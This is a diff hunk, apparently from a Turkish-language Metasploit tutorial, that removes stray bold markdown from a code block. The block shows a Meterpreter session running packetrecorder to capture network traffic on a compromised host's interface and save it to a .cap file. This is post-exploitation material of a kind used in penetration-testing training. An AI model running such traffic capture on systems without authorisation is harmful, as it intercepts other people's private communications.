@@ -179,12 +179,12 @@ Bu örneğimizde 3 adet ağ cihazı olduğunu görüyoruz. `-i 2` seçeneği ile
 ```bash
 meterpreter > run packetrecorder -i 2 -l /root/
 > Starting Packet capture on interface 2
-**[**+] Packet capture started
+[+] Packet capture started
 > Packets being saved **in **to /root/logs/packetrecorder/XEN-XP-SP2-BARE_20101119.5105/XEN-XP-SP2-BARE_20101119.5105.cap
 > Packet capture interval is 30 Seconds
 ^C
 > Interrupt 
-**[**+] Stopping Packet sniffer...
+[+] Stopping Packet sniffer...
 meterpreter >
 ```
 
